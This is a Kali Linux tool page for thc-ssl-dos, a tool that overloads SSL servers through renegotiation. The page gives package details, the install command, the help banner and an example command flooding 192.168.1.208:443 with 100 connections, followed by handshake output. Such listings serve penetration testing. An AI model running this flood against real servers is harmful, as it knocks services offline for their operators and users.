---
Title: thc-ssl-dos
Homepage: http://www.thc.org/thc-ssl-dos/
Repository: https://gitlab.com/kalilinux/packages/thc-ssl-dos
Architectures: any
Version: 1.4-1kali4
Metapackages: kali-linux-everything kali-linux-large kali-tools-vulnerability kali-tools-web 
Icon: /images/kali-tools-icon-missing.svg
PackagesInfo: |
 ### thc-ssl-dos
 
  THC-SSL-DOS is a tool to verify the performance of SSL.
   
  Establishing a secure SSL connection requires 15x more processing
  power on the server than on the client.
   
  THC-SSL-DOS exploits this asymmetric property by overloading the
  server and knocking it off the Internet.
   
  This problem affects all SSL implementations today. The vendors are aware
  of this problem since 2003 and the topic has been widely discussed.
   
  This attack further exploits the SSL secure Renegotiation feature
  to trigger thousands of renegotiations via single TCP connection.
 
 **Installed size:** `35 KB`  
 **How to install:** `sudo apt install thc-ssl-dos`  
 
 {{< spoiler "Dependencies:" >}}
 * libc6 
 * libpcap0.8
 * libssl3 
 * openssl
 {{< /spoiler >}}
 
 ##### thc-ssl-dos
 
 
 ```
 root@kali:~# thc-ssl-dos -h
      ______________ ___  _________
      \__    ___/   |   \ \_   ___ \
        |    | /    ~    \/    \  \/
        |    | \    Y    /\     \____
        |____|  \___|_  /  \______  /
                      \/          \/
             http://www.thc.org
 
           Twitter @hackerschoice
 
 Greetingz: the french underground
 
 ```
 
 - - -
 
---
{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## thc-ssl-dos Usage Example

Using 100 connections (`-l 100`), flood the target IP (`192.168.1.208`) and port (`443`):

```
root@kali:~# thc-ssl-dos -l 100 192.168.1.208 443 --accept
     ______________ ___  _________
     \__    ___/   |   \ \_   ___ \
       |    | /    ~    \/    \  \/
       |    | \    Y    /\     \____
       |____|  \___|_  /  \______  /
                     \/          \/
            http://www.thc.org

          Twitter @hackerschoice

Greetingz: the french underground

Waiting for script kiddies to piss off................
The force is with those who read the source...
Handshakes 0 [0.00 h/s], 1 Conn, 0 Err
Handshakes 2 [2.90 h/s], 6 Conn, 0 Err
Handshakes 25 [22.42 h/s], 13 Conn, 0 Err
Handshakes 70 [43.97 h/s], 20 Conn, 0 Err
Handshakes 125 [56.51 h/s], 27 Conn, 0 Err
Handshakes 185 [62.09 h/s], 33 Conn, 0 Err
Handshakes 262 [74.56 h/s], 41 Conn, 0 Err
Handshakes 365 [104.93 h/s], 47 Conn, 0 Err
Handshakes 496 [131.23 h/s], 54 Conn, 0 Err
```
